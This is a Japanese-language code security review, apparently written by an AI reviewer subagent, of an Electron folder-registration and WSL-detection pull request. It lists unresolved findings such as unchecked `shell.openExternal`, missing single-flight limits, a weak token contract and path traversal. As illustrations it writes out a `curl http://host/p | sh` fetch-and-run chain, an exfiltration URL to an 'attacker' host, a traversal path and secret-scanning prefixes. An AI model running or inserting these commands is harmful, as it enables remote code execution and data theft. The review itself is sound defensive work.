# security-reviewer Review: フォルダ登録とランタイム検出 (R-1)

**Run**: 2026-09-16
**Reviewer**: security-reviewer
**Spec**: specs/001-runtime-folder-registration-runtime-detection/spec.md
**Round**: 2 (pr-gate)

> **本ファイルの保存経緯**: 本 subagent に `Write` tool が渡されていないため、
> reviewer の最終報告を pr-gate が保存したものである。

## 初回読了 viewpoint

**FR/SC (本 Round で A/B の owner 範囲に触るもの)**

- FR-010 / FR-015: 境界での同時実行の束ね・ブラウズ開始 (`folder-service.ts` / `runtime-store.ts`)
- FR-016 / FR-019 / FR-027: 重複判定キー・永続化レコードの復元検証・実在確認の限定 (`folder.ts` / `folder-record.ts`)
- FR-021 / FR-025 / FR-026: 3 名前空間の分離とパス API 独占 (`path-types.ts` / `path-api.ts`)
- FR-035 / FR-037 (f) / FR-038 / FR-041: 依存グラフの強制・ディストロ内スクリプトの内容検査・`electron` import 限定 (`.dependency-cruiser.js` / `scripts/constitution/*` / `composition-root.ts`)
- FR-039 / FR-040: 送信元検証・origin 集合の単一化・CSP・ナビゲーション拒否 (`validate.ts` / `origins.ts` / `protocol.ts` / `window.ts`)
- SC-008 / SC-009 / SC-017: 違反サンプルの全数検出・通常検証の違反 0 件・未検出経路の追跡 (`scripts/rules/run.mjs` / `tests/rule-fixtures/expected.mjs`)
- SC-016 / SC-018: CSP・ナビゲーション拒否の計測経路 / 検証表の各行

**touched files に該当する charter / Confirmation**

- `docs/domains/runtime/charter.md` — パス API の業務ルール、WSL 検出 KPI
- `docs/domains/ui/charter.md:41-47` — 配信プロトコル・CSP 基線・検証項目 10 の固定
- AD-023 (accepted) §5 / §7 / §8 — 調停は I/O をインタフェース経由で受け取る / 依存グラフの層規則 / `electron` import 許可 2 箇所。Electron セキュリティ要件を全面採用
- AD-025 (accepted) §7 / §9 — CSP 緩和は 1 関数の dev 分岐のみ / **許可リストは実名で列挙する**
- AD-015 (accepted) §4 — UTF-8 要求 (`WSL_UTF8`)

**viewpoint 網羅性**

- A. 認可 / 認証 / RLS / secret: Critical:0 High:1 Medium:2 Low:1
- B. 入力検証 / injection / XSS / CSRF / 暗号: Critical:0 High:1 Medium:3 Low:4
- C. 業務不変条件 / Charter drift: 該当なし: `architecture-reviewer` の Owner。Round 1 の C-002 解消の妥当性判定も同 reviewer / `platform-boundary-reviewer` の Owner と指示されている
- D. Constitution / ADR drift: 該当なし: `architecture-reviewer` の Owner (AD-023 §5 / AD-025 §9 との差分は下記 M-005 の**根拠**として引用し、drift としては二重計上しない)
- E. User Story / SC / AC / UX: 該当なし: `po-reviewer` の Owner
- F. 命名 / module 配置 / lint hookup: 該当なし: `convention-reviewer` の Owner (`.dependency-cruiser.js` の `from` 実名列挙が本番設定にテスト fixture パスを含む点は F の範囲として送る)
- G. DB / API / a11y / perf / OpenAPI / UX state: 該当なし: migration / `.sql` / OpenAPI が 0 件。a11y / ux は code-gate iteration 2 で実施済み
- H. テスト / coverage / observability / regression: 該当なし: 検証経路の不備は A / B 各指摘の推奨アクションに内包した (Round 1 と同じ扱い。単独計上すると同一事象の二重計上になる)

## スコープ要約

Round 2 の diff 増分 (207 files / +41,799、Round 1 比 +8 files / +4,462) のうち、**新規ファイル 8 件はすべて `specs/**` の gate 生成物** (各 reviewer の `*.round1.md` バックアップ / `pr-gate.md` / `.gate-verdict-pr*.json`) であり、実コードの増分は指示された 3 コミットに限られる。よって security 観点の新規調査対象は (1) `scripts/rules/run.mjs` の 1 件ずつ展開・後始末、(2) `folder-service.ts` の `node:crypto` 撤去と `newId` 注入、(3) `composition-root.ts` の結線、(4) `.dependency-cruiser.js` の `services-not-to-io`、(5) 新規 fixture の 5 点である。

**秘密情報は依然 0 件** — `sk-` / `AIza` / `ghp_` / `glpat-` / `AKIA` / `xoxb-` / private key ブロックを repo 全体で走査し、実ヒットは 0 件 (2 件のヒットは `.claude/agents/security-reviewer.md` と `.claude/skills/.../security-reviewer.md` の**本 reviewer 自身の grep パターン定義**であり値ではない)。`electron-builder.yml:10` の `.env` 除外、renderer bundle への env 焼き込み 0 件も Round 1 から不変である。

3 コミットが持ち込んだ security 上の新事実は 2 つある。第一に、**ブラウズトークンの生成源が `node:crypto` の直接 import から `deps.newId: () => string` へ移った**ことで、エントロピーの担保が「構造 (import)」から「結線 1 行 + docstring の契約」へ降格した。現在の結線 (`randomUUID().replace(/-/g,'')` = 128 bit 由来の 32 桁 16 進) は正しく CSPRNG であり**現時点のエントロピーと予測不能性は保たれている**が、`FolderServiceDeps.newId` の契約文面は「8 文字以上の英数字」しか要求せず、しかもその最低限の検査 (`makeFolderId`) は**フォルダ ID 経路にしか掛かっていない** — トークン経路 (`folder-service.ts:255`) は `newId()` の戻り値を無検査でセッション鍵にする。加えて `services-not-to-io` 規則が `folder-service.ts` からの `node:crypto` import を**恒久的に禁じた**ため、この担保をサービス内へ戻す選択肢は構造的に閉じられている。第二に、`run.mjs` の後始末ガードが `SANDBOX_DIR` の**末尾一致しか見ていない**ため、リポジトリルート外への封じ込めが成立していない。

**Round 1 の 10 件 (High 2 / Medium 4 / Low 4) は 1 件も解消されていない** (下表で file:line 再確認済み)。3 コミットはいずれも Round 1 の Critical 2 件に対する対応であり、High 以下には触れていない。

**重複抑制の遵守**: code-gate iteration 1 の MUST_FIX 7 件 (`.gate-verdict-code.json` の `iter1_must_fix_resolution` / `code-gate.md:70-83`) はすべて resolved / partially_resolved として扱い再指摘していない。特に MF-003 (`ipc.ts:122-127` の `event.sender.id` 束縛、再確認済み: `ipc.ts:119,127`) と MF-004 (`index.html` 静的 CSP 撤去 → `protocol.ts:173` / `window.ts:76`) は解消を確認した。下記 M-005 は `folder-service.ts` の**トークン発行行**に対する指摘であり、MF-003 の送信元束縛 (同ファイル `:282`) とは**異種 origin** である (MF-003 は「誰が使えるか」、M-005 は「値が推測できるか」)。

## Round 1 指摘 10 件の解消状況 (必須判定)

| Round 1 ID | severity | 内容 | 判定 | 再確認した根拠 (file:line) |
|---|---|---|---|---|
| H-001 | High | `shell.openExternal` に scheme 許可リストが無い | **未解消** | `src/main/app/window.ts:47-50` (`setWindowOpenHandler` → `void shell.openExternal(url)` / `action: 'deny'`)、`:62-65` (`will-navigate` → `preventDefault()` の直後に `void shell.openExternal(url)`) がいずれも **1 文字も変わっていない**。`openExternal` の repo 全 grep は `src/` 内 2 件 (`window.ts:48` / `:64`)、scheme 許可リスト定義 **0 件**、挙動テスト **0 件** |
| H-002 | High | single-flight 不在による資源枯渇 (FR-010) | **未解消** | `inflight\|inFlight\|singleFlight\|single-flight\|coalesc` を `src/` 全走査で **0 件**。`folder-service.ts:251` が `beginBrowse` ごとに `detector.verifyRunning([namespace])` を呼ぶ形も不変 (`ensureVerified()` の TTL キャッシュ (`:130-134`) はこの経路に掛からない)。`sessions` (`:108`) は `:256` で `set` されるだけで**件数上限・期限切れの定期回収は 0 件**、削除は `:298` / `:318` の 2 経路のみ |
| M-001 | Medium | `session` の permission ハンドラ未設定 | **未解消** | `setPermissionRequestHandler\|setPermissionCheckHandler` を `src/` 全走査で **0 件**。`window.ts:72` の `session.webRequest` 参照だけが残る |
| M-002 | Medium | 項目 6 (iii) の許可形検査が行内の部分一致 | **未解消** | `scripts/constitution/check.mjs:315` が `DISTRO_SCRIPT_ALLOWED_FORMS.some((form) => body.includes(form))` のまま。`allowlists.mjs:250` の `DISTRO_SCRIPT_FORBIDDEN_FORMS` は `['>', '>>', 'tee', 'dd ', 'install ', 'mkdir', 'touch']` のまま — `;` / `&&` / `\|` / `` ` `` / `$(` / `rm ` / `curl` / `sh -c` / `eval` は依然 0 件 |
| M-003 | Medium | CSP の dev ゲート検査が bracket 記法を見逃す | **未解消** | `check.mjs:449` が `/process\s*\.\s*env\s*\.\s*[A-Za-z0-9_]+/` のまま。`src/main/app/origins.ts:34` / `:58` の bracket 記法は不変。対照の `allowlists.mjs:265-280` が bracket / 分割代入を列挙済みという強度差も不変 |
| M-004 | Medium | ホスト名前空間のパスに `.` / `..` の拒否も正規化も無い | **未解消** | `src/domain/runtime/path-types.ts:80-94` `makeHostPath` に `.`/`..` の行が無い (長さ・禁止文字・ドライブレター形式・末尾セパレータのみ)。対照の `makeRuntimePath` は `:113` でバックスラッシュ、`:117` で `.`/`..` を拒否している — 非対称が残る |
| L-001 | Low | protocol ハンドラが要求 URL の host を無検査 | **未解消** | `src/main/app/protocol.ts:115` が `new URL(requestUrl).pathname` だけを使い host を捨てる。`PACKAGED_ORIGIN` との突き合わせ 0 件 |
| L-002 | Low | `wsl.exe` 子プロセスに親環境を丸渡し | **未解消** | `src/main/infra/runtime/wsl-cli.ts:87` が `env: { ...process.env, WSL_UTF8: '1' }` のまま |
| L-003 | Low | mac entitlements が dyld 環境変数と未署名実行メモリを許可 | **未解消 (R-1 では変更不要と再確認)** | `build/entitlements.mac.plist:5-10` が `allow-jit` / `allow-unsigned-executable-memory` / `allow-dyld-environment-variables` を `true` のまま。macOS は spec の Out of Scope であり Round 1 の推奨 (D-1 / OPT-mac で再評価) を維持する |
| L-004 | Low | プロトコル応答に `nosniff` が無い | **未解消** | `protocol.ts:169-175` の 200 応答ヘッダは `Content-Type` と `Content-Security-Policy` の 2 つのみ。`X-Content-Type-Options` は `src/` 全走査で **0 件** |

**resolved from Round 1: 0 / unresolved: 10 / new: 2**

Round 1 の High 2 件はいずれも Severity を**据え置く** (`reviewer-base.md` §Round 間 severity 格上げの制約に照らし、Critical へ格上げする「追加事実」は観察できていない — `window.ts` / `runtime-store.ts` / `folder-service.ts` の該当経路は Round 1 と同一状態であり、renderer 側のスクリプト実行という別の破れを 1 つ要する構図も変わっていない)。

## Findings

### [High] `shell.openExternal` に scheme の許可リストが無く、FR-040 の「拒否」が「OS への転送」になっている (H-001 / Round 1 からの継続) (scope: feature)

- **観察**: `src/main/app/window.ts:47-50` と `:62-65`。Round 1 の観察から変更なし。

  ```ts
  window.webContents.setWindowOpenHandler(({ url }) => {
    void shell.openExternal(url)
    return { action: 'deny' }
  })
  ```

  `will-navigate` 側 (`:53-66`) も、許可 origin 外のすべてに対して `event.preventDefault()` の直後に `void shell.openExternal(url)` を呼ぶ。**どちらにも scheme の検査が無い**。検証項目 11 (`scripts/constitution/check.mjs:502-510`) は `setWindowOpenHandler(` と `.on('will-navigate'` の**呼び出しの存在**しか見ない。
- **同種事象探索**: `setPermissionRequestHandler|setPermissionCheckHandler|openExternal` を `src/` 全走査 → **2 件** (`window.ts:48` / `:64`、いずれも scheme 無検査)。scheme 許可リストを定義した箇所 **0 件**。`openExternal` / `will-navigate` / `setWindowOpenHandler` の**挙動**を検証するテスト **0 件**。
- **リスク/影響**: Round 1 と同一。`shell.openExternal` は Windows で `ShellExecute` 相当であり、`file:///C:/...exe` / `smb://host/share/x.exe` / 任意の登録済みカスタムプロトコルを渡すと **`sandbox: true` の renderer から sandbox 外でプログラムを起動できる** (CWE-749)。`connect-src 'none'` で閉じた外部通信も `openExternal('https://attacker/?d=...')` で復活し、CSP の exfiltration 封鎖を素通りする。実害成立には renderer 側の別の破れを 1 つ要するため `reviewer-base.md` §禁則に従い **High 上限**。
- **推奨アクション**: Round 1 から不変 — (1) `origins.ts` に `EXTERNAL_URL_SCHEMES = ['https:', 'http:']` を新設し `window.ts:48` / `:64` の両方で `new URL(url).protocol` を照合、不一致は**何もしない**。(2) `check.mjs` 項目 11 を存在確認から内容検査へ広げる (`action: 'deny'` の返却 / 許可リスト定数の参照 / 定数定義が 1 箇所)。(3) `file:` / `smb:` / 未知 scheme が `openExternal` に到達しないハンドラ単体テストを追加。**2 箇所に定数 1 つを足すだけで閉じる。**
- **根拠**: FR-040 (最終段)、SC-016、AD-023 (Electron セキュリティ要件の全面採用)、CWE-749 / CWE-939、Electron Security Checklist #14
- **scope 根拠**: `window.ts` / `check.mjs` はいずれも本 PR の touched files

### [High] renderer 由来の IPC が `wsl.exe` のプロセス起動とセッション Map を無制限に増やせる (single-flight が実装されていない) (H-002 / Round 1 からの継続) (scope: feature)

- **観察**: FR-010 が「**境界で強制する制約であり、UI の作り方に委ねてはならない — 再検出・判定・ブラウズ開始は同時実行を 1 本に束ね、追加要求は既存結果へ合流させる**」と明記した束ねが、実装のどこにも無い。
  - `ipc.ts:89` `refreshRuntimes` → `composition-root.ts:85-94` → `runtime-store.ts` `detect()` が無条件に `detector.list()` を呼び、`wsl-detector.ts:72-76` が毎回 3 プロセス起動する。さらに `composition-root.ts:92` が `void runtimes.probeAll()` を投げ、`verifyRunning` 1 回 + ディストロごとの `probe` が加わる。
  - `folder-service.ts:251` `beginBrowse` は毎回 `detector.verifyRunning([namespace])` を呼ぶ。`ensureVerified()` (`:130-134`) の TTL キャッシュは**この経路に掛かっていない** (`list` 経路専用)。
  - `folder-service.ts:108` `sessions: Map<string, BrowseSession>` は `:256` で `set` されるだけで、**件数上限も期限切れの定期回収も無い**。`BROWSE_SESSION_TTL_MS` は import 済み (`:26`) なので判定材料は揃っている。
- **同種事象探索**: `inflight|inFlight|single-flight|singleFlight|coalesc` を `src/` 全走査 → **0 件**。プロセス起動箇所は `wsl-cli.ts:84` の **1 件**、そこへ到達する renderer 制御の IPC チャンネルは **4 件** (`refreshRuntimes` / `probeRuntime` / `beginBrowse` / `listFolders` (TTL 経由))。回数制限 (rate limit / 同時実行上限 / in-flight 共有) **0 件**。`sessions` 上限・掃除 **0 件**。
- **リスク/影響**: 送信元検証を通った renderer が `for(;;) closta.refreshRuntimes()` を回すと 1 反復あたり最低 3 プロセス (判定込みで 4+N) の `wsl.exe` が起動し、各プロセスは最長 10〜20 秒生存する (`wsl-cli.ts:28,31`)。同時実行の上限が無いためプロセステーブルとメモリを食い潰し、**ホスト側のサービス停止に至る** (CWE-770)。`sessions` も単調増加する。`beginBrowse` の連打は 1 要求 1 プロセスで最も安く到達できる経路である。SC-004 の 300 ms / 4 秒予算も並行要求下では成立しない。
- **推奨アクション**: Round 1 から不変 — (1) `runtime-store.ts` に in-flight promise を持たせ `detect()` / `probeAll()` / `probeOne(id)` を single-flight に。(2) `beginBrowse` を名前空間ごとの in-flight で束ね、`ensureVerified()` の TTL キャッシュと確認経路を共有。(3) `sessions` に上限 (送信元ごと 8 件、超過時は最古を破棄) と `now()` 基準の期限切れ掃除。(4) `pickHostFolder` (`composition-root.ts:107`) も同時に 1 つだけ開く。(5) SC-018 の検証表テストに「同一チャンネルへの連続要求がプロセス起動を比例させないこと」を 1 ケース (`wsl-cli` はインタフェースなので spawn 回数を数えられる)。
- **根拠**: FR-010、SC-004、CWE-770 / CWE-400、OWASP API4:2023
- **scope 根拠**: `runtime-store.ts` / `folder-service.ts` / `composition-root.ts` / `ipc.ts` はいずれも本 PR の touched files

### [Medium] ブラウズトークンの生成源が注入になった結果、CSPRNG の担保が「構造」から「結線 1 行 + 契約文面」に降格し、契約文面が要求しているのは「8 文字以上の英数字」だけである (M-005 / 新規・`cfec16b` 由来) (scope: feature)

- **観察**: `cfec16b` が `folder-service.ts` から `node:crypto` の直接 import を撤去し `deps.newId: () => string` に置き換えた。**トークンのエントロピーは現時点では保たれている** — `composition-root.ts:80` の `newId: () => randomUUID().replace(/-/g, '')` は `node:crypto` の CSPRNG に乗る v4 UUID (乱数 122 bit) から 32 桁の 16 進を返し、`folder-service.ts:255` の `const token = newId()` はそれをそのままセッション鍵にする。問題は**担保の置き場所と契約の強度**である。

  1. **契約文面が乱数性を一言も要求していない。** `folder-service.ts:95-97`:

     ```ts
     * 8 文字以上の英数字を返すこと。`makeFolderId` が短すぎる値を拒否する。
     */
     readonly newId: () => string
     ```

     「暗号論的に安全な乱数源であること」「予測不能であること」「衝突しないこと」はどこにも書かれていない。`Date.now().toString(36)` や連番は**この契約を満たす**。
  2. **その最低限の検査すらトークン経路には掛かっていない。** docstring が引く保護 `makeFolderId` (`registry.ts:65-69`) は `random().replace(/[^0-9a-z]/g,'')` が 8 文字未満なら throw するが、これは**フォルダ ID 経路 (`folder-service.ts:212`) 専用**である。トークン経路 (`:255`) は `newId()` の戻り値を長さも文字種も**無検査**で `sessions.set(token, ...)` の鍵にする (`:256`)。`newId` が定数や空文字を返す実装なら全セッションが 1 つの鍵に潰れ、**後発の `beginBrowse` が先行セッションを上書きする**。つまり docstring が主張する保護が、守るべき値の側には届いていない。
  3. **担保をサービス内に戻す道が構造的に閉じられた。** 同コミットの `.dependency-cruiser.js:215-247` `services-not-to-io` は `from: ^src/main/app/(folder-service|runtime-store)[.]ts$` に対し `to` を `ALL_CORE` から `assert` / `util` / `events` を除いた全標準モジュールとしている。したがって `folder-service.ts` は `node:crypto` を**恒久的に import できない** — 将来 `crypto.timingSafeEqual` や独自のトークン生成を入れる選択肢も同時に閉じている。担保の唯一の置き場が `composition-root.ts:80` の 1 行になった。
  4. **その 1 行を検査する機械的経路が無い。** `newId` の結線が CSPRNG であることを検査する lint 規則 / depcruise 規則 / `check.mjs` 項目は **0 件**。`tests/rule-fixtures/expected.mjs` の 21 件にも「調停の乱数源が CSPRNG でない」形の違反サンプルは無い。
  5. **同一生成源を「公開される識別子」と「ベアラトークン」の両方に使っている。** `newId` はフォルダ ID (`:212` → `wf_<24 桁>` として renderer へ返り `folder-record.ts` 経由でディスクに平文保存) とブラウズトークン (`:255` = 秘密) の双方を引く。CSPRNG の独立抽出なら無害だが、契約が許す決定的な生成源 (連番 / 時刻) だと**永続化ファイルに残る ID が同じ生成器の状態を漏らす** — トークンの推測に直結する。
  6. **テストは決定的な `newId` を注入して通る。** `folder-service.test.ts:125` `const newId = (): string => \`testid${String(++idSeq).padStart(8,'0')}\`` により、テスト内のトークンは `testid00000001` である。テストが決定的であること自体は正しいが、**トークンの最小長 / 文字種 / 非再現性を境界で固定するテストは 0 件**なので、「決定的な生成源で全テストが緑」という状態が回帰の受け皿になっている。
- **同種事象探索**: `createFolderService|newId` を repo 全走査 (`**/*.{ts,tsx,mjs,js}`) → **12 件**。生成源の結線は **1 件**のみ (`composition-root.ts:80`、CSPRNG である) / 消費は **2 件** (`folder-service.ts:212` ID / `:255` トークン) / テストの注入 **1 件** (`folder-service.test.ts:125`、決定的)。`createFolderService` の呼び出しは本番 1 件 + テスト 1 件で、**弱い生成源を渡している本番経路は 0 件**。`newId` / トークンの乱数性を検査する機械的経路 (lint / depcruise / `check.mjs` / fixture) **0 件**。契約 (`contracts/ipc-capability.md:221`) の `token` 行はトークンに「既知の有効なトークン」「発行した送信元と一致」「有効期間内」の 3 点しか要求せず、**予測不能性への言及 0 件** (`spec.md` / `data-model.md` の「トークン」grep でも該当 0 件)。
- **リスク/影響**: **現時点で悪用可能な経路は無い** (結線は CSPRNG、かつ `:282` の送信元束縛と単一ウィンドウ構成が併存する) ため Critical / High には置かない。残す理由は 3 つある。(a) C-002 の修正がレイヤ規則を満たす代償として、**セキュリティ資産 (ベアラトークン) の生成源を型でも検査でもなく docstring 1 行に委ねた** — しかもその docstring が要求している強度はトークンに必要な強度から遠い (CWE-330 Use of Insufficiently Random Values / CWE-340 Generation of Predictable Numbers or Identifiers)。(b) `folder-service.ts:52-57` の docstring 自身が「AD-025 の目標レイアウトは Browser / PR Webview を**別 WebContents** で持つ」と書いており、その時点で送信元束縛による救済が薄れ、トークンの予測不能性が唯一の防御になる。(c) `newId` の実名結線を足すべき将来の調停 (`services-not-to-io` の comment が名指す X-1 `SessionService` / X-3 `ProviderService` / I-2 `ContainerService`) は**同じ契約文面を読んで生成源を書く**ため、弱い実装が入る確率が構造的に残る。
- **推奨アクション**:
  1. **契約文面を値の用途に合わせる。** `FolderServiceDeps` を `newId` 1 本で兼用するのをやめ、`newId: () => string` (公開識別子。現行の「8 文字以上の英数字」で足りる) と `newToken: () => string` (**暗号論的に安全な乱数源から 128 bit 以上を生成すること。推測・列挙・再現が不能であること**) に分ける。同一生成源から引くこと自体は構わないが、契約が 2 つに分かれていれば将来の実装者が用途を取り違えない。
  2. **トークン経路にも境界検査を置く。** `beginBrowse` で `newId()` / `newToken()` の戻り値を検証する (最小長 26 文字以上・`[0-9a-z]` のみ・既存 `sessions` に衝突しないこと)。満たさない場合は throw して起動時に落とす — 弱い生成源を「動くが弱い」状態で出荷させない。`makeFolderId` が ID 側で throw しているのと同じ扱いに揃える。
  3. **機械検証を 1 本足す。** `check.mjs` に「`composition-root.ts` の `newToken` / `newId` の結線式が `node:crypto` の `randomUUID` / `randomBytes` を参照していること」の項目を追加する。これは `check.mjs:449` の CSP ゲート検査 (結線式の形を見る検査) と同型であり、既存の仕組みに載る。あわせて `tests/rule-fixtures/` に「調停の乱数源に `Date.now()` を渡す」違反サンプルを 1 件足し、`test:rules` の期待表で `constitution: #N` の発火を固定する (**現在この形の fixture は 0 件**)。
  4. **契約書に予測不能性を明記する。** `contracts/ipc-capability.md:221` の `token` 行に「トークンは暗号論的乱数から生成し、列挙・推測が不能であること」を 1 行足す。現在 3 つの要求 (既知 / 送信元一致 / 期限内) はいずれも「盗まれたトークン」を想定しており、「**当てられたトークン**」を想定していない。
  5. テストに「連続する 2 回の `beginBrowse` が異なるトークンを返す」だけでなく「境界検査が弱い生成源を拒否する」ケースを置く (2. を入れれば自然に書ける)。
- **根拠**: CWE-330 / CWE-340 / CWE-1241 (Use of Predictable Algorithm in Random Number Generator)、OWASP ASVS V3.2.2 (session token entropy) / V6.3.1 (CSPRNG)、AD-023 §5 / §7 (調停は I/O をインタフェース経由で受け取る — 本指摘はこの方針の否定ではなく、方針に沿ったまま契約の強度を上げる提案である)、AD-025 §9 (「対象の無いルールを書いて強制したと数えない」の逆 — **対象が 1 件あるのにルールが無い**)、`contracts/ipc-capability.md:221`
- **scope 根拠**: `folder-service.ts` / `composition-root.ts` / `folder-service.test.ts` / `contracts/ipc-capability.md` / `scripts/constitution/check.mjs` / `tests/rule-fixtures/` はいずれも本 PR の touched files。修正は feature 内で完結する

### [Medium] `session` の permission ハンドラが未設定で、Electron の既定 (許可) のままになっている (M-001 / Round 1 からの継続) (scope: feature)

- **観察**: `setPermissionRequestHandler` / `setPermissionCheckHandler` の呼び出しが `src/` に **0 件** (Round 2 で再走査)。`window.ts:32-38` の `webPreferences` は `sandbox` / `contextIsolation` / `nodeIntegration` を明示するが、`window.webContents.session` に対する permission 制御は無い (`:72` で `session.webRequest.onHeadersReceived` は使っており session へのアクセス手段は既にある)。
- **同種事象探索**: `setPermissionRequestHandler|setPermissionCheckHandler` → **0 件** (H-001 と同じ 1 回の grep で確認)。session 参照は `window.ts:72` のみ。
- **リスク/影響**: Electron はハンドラ未設定時に権限要求を既定で許可する。renderer は `default-src 'none'` の CSP 下にあり外部コンテンツを読まないため現状の露出は小さいが、`display-capture` / `media` / `clipboard-read` が無条件に通る状態は、AD-023 が「全面的に採用する」と宣言した Electron セキュリティチェックリストの項目 (Handle session permission requests) が未実装であることを意味する (CWE-276)。
- **推奨アクション**: `window.ts` (または `app` の起動経路) で `session.setPermissionRequestHandler((_wc, _perm, callback) => callback(false))` と `setPermissionCheckHandler(() => false)` を置く。R-1 は権限を 1 つも要しないので全拒否が正しい既定であり、必要になった feature が許可集合を 1 定数として追加する形にする (`allowedOrigins` と同じ集約方針)。`check.mjs` 項目 11 に存在確認を追加する。
- **根拠**: AD-023、FR-039、CWE-276、Electron Security Checklist #5
- **scope 根拠**: `window.ts` は本 PR の touched files

### [Medium] 項目 6 (iii) の許可形検査が行内の部分一致であり、許可形を 1 語含む行に任意のコマンドを連ねられる (M-002 / Round 1 からの継続) (scope: feature)

- **観察**: `scripts/constitution/check.mjs:312-318` が Round 1 から不変。

  ```js
  for (const line of script.split('\n')) {
    const body = line.trim()
    if (body === '' || body.startsWith('#')) continue
    if (!DISTRO_SCRIPT_ALLOWED_FORMS.some((form) => body.includes(form))) { ... }
  }
  ```

  判定は `body.includes(form)` であり**行全体が許可形に収まっていることを要求しない**。`allowlists.mjs:239-247` の許可形は `command -v` / `test -` / `unshare` / `cat /proc/` / `echo` / `printf` / `exit`、`:250` の禁止形は `['>', '>>', 'tee', 'dd ', 'install ', 'mkdir', 'touch']` のみで、**`;` / `&&` / `||` 以降の連結、`|` によるパイプ、`` ` `` / `$(...)` のコマンド置換、`rm` / `mv` / `cp` / `ln` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を禁じる行が 0 件**。`printf 'bwrap=%s\n' "$x"; curl http://host/p | sh` は (i) 単一リテラル、(ii) 標準入力へ書く式が識別子そのもの、(iii) 各行が `printf` を含む、を**すべて満たす**。
- **同種事象探索**: `DISTRO_SCRIPT_ALLOWED_FORMS|DISTRO_SCRIPT_FORBIDDEN_FORMS` → 定義 **2 件** (`allowlists.mjs:239` / `:250`)、使用 **2 件** (`check.mjs:307` / `:315`)。行全体を錨付け (`^...$`) で照合する実装 **0 件**。`;` / `|` / `` ` `` / `$(` を禁止形に含める行 **0 件**。
- **リスク/影響**: 最終的な担保は人間の ADR レビューであると `probe-script.ts:4` / `check.mjs:325` が明記済みなので「唯一の防御が無効」ではなく、**3 点検査のうち (iii) が意図した強度に達していない**という残余である。現在の `PROBE_SCRIPT` は許可形に正しく収まっており違反は無い。
- **推奨アクション**: (iii) を「行全体が許可形の錨付きパターンに一致すること」に変える。あるいは最小の追加として `DISTRO_SCRIPT_FORBIDDEN_FORMS` に `;` / `&&` / `| ` / `` ` `` / `$(` / `rm ` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を加える。`probe-script.ts:20-25` が「リダイレクトを 1 つも使わない」理由として述べている論法 (「1 つでも許すと検証の意味が薄れる」) は連結・パイプにもそのまま当てはまる。
- **根拠**: Constitution Principle VI、FR-037 (f)、CWE-78 (検査の不完全性として)
- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files

### [Medium] CSP の dev ゲート検査が `process.env` のドット記法しか見ず、bracket 記法を見逃す (M-003 / Round 1 からの継続) (scope: feature)

- **観察**: `scripts/constitution/check.mjs:449` が Round 1 から不変 — `const envGate = /process\s*\.\s*env\s*\.\s*[A-Za-z0-9_]+/.exec(src.code)`。FR-040 は「ゲートは `app.isPackaged` とする — 環境変数で判定すると出荷物でも環境変数 1 つで有効化できる」と要求し、項目 10 (d) がこれを検査するが、正規表現はドット記法限定であり、**このリポジトリ自身が bracket 記法を使っている** (`src/main/app/origins.ts:34` / `:58` が `process.env['ELECTRON_RENDERER_URL']`)。同じ書き方を `protocol.ts` の dev 分岐に持ち込めば検査は発火しない。
- **同種事象探索**: `process\s*\.\s*env|process\[` を `src/` で grep → **3 件** (`origins.ts:34` / `:58` / `wsl-cli.ts:87`)。うち **2 件が bracket 記法**で現行の検査パターンでは捕捉できない。等価経路 (bracket / 分割代入 / `Object.entries(process.env)`) を見る行 **0 件**。対照: `allowlists.mjs:265-280` の Principle II 用パターンは bracket 記法と分割代入を**きちんと列挙している** (`:279` の `/\bprocess\s*\.\s*env\s*\.\s*(OS|OSTYPE)\b/` を含む一群) ため、同一リポジトリ内で強度が揃っていない。
- **リスク/影響**: 現時点で `protocol.ts` は `process.env` を一切参照せず実効ゲートは `origins.ts` の `!app.isPackaged` なので**違反は無い**。問題は検査の網であり、FR-036 が Principle II の検査に課した「識別子の直接参照だけでなく等価な API と構文変形も対象とする」要求が FR-040 側の検査に反映されていない点。R-2 以降で dev 分岐を触る feature が bracket 記法を使えば静かに抜ける (CWE-693)。
- **推奨アクション**: `allowlists.mjs` に `ENV_ACCESS_PATTERNS` を新設し、ドット記法・bracket 記法 (`process\s*\[\s*['"\`]env['"\`]\s*\]` も含む)・分割代入 (`{...env...} = process`) を列挙して項目 10 (d) と将来の項目から共用する。`PLATFORM_BRANCH_PATTERNS` と同じ書式に揃えれば強度差が構造的に生じない。
- **根拠**: FR-040 / FR-036 / SC-016、AD-025 §7、CWE-693
- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files

### [Medium] ホスト名前空間のパスに `.` / `..` の拒否も正規化も無く、`registerFolder` + `listFolders` が任意ホストパスの存在オラクルになる (M-004 / Round 1 からの継続) (scope: feature)

- **観察**: `src/domain/runtime/path-types.ts:80-94` `makeHostPath` は長さ・禁止文字・ドライブレター形式・末尾セパレータのみを扱い、**`.` / `..` セグメントを拒否も解決もしない**。対照の `makeRuntimePath` (`:106-121`) は `:113` でバックスラッシュ、`:117` で `.`/`..` を明示的に拒否する。IPC 境界の `validate.ts:69` も `if (p.namespace === 'host') return true` のまま。したがって `registerFolder({ location:{kind:'windows'}, path:{namespace:'host', value:'C:\\Users\\x\\..\\..\\Windows\\System32\\config'}, ... })` が受理され、`folder-service.ts:148` の `hostFs.exists(folder.path)` が `stat` を発行して結果が `reachability` として renderer に返る。
  `folder-service.ts:144-148` のコメントは「所在 `windows` の実在確認。**登録済みエントリに限る** (FR-027) ので、任意パスの存在を問い合わせる経路にはならない」と主張するが、**登録自体に回数制限も由来の要求も無い**ため register → list を繰り返せば任意ホストパスの存在を列挙できる。コメントが主張する不変条件が実装で成立していない。
  併せて `src/domain/workspace/folder.ts:100` `folderKey` が未正規化の `path.value` を鍵にするため `C:\a\..\b` と `C:\b` は別エントリになる — FR-016 の「末尾セパレータの有無は正規化後に同一とみなす」と同じ論法が `..` には効いていない (`registry.ts:18-23` の docstring が「パス API の生成関数が正規化済みなのでここは完全一致で足りる」と前提しているが、ホスト側はその前提を満たしていない)。
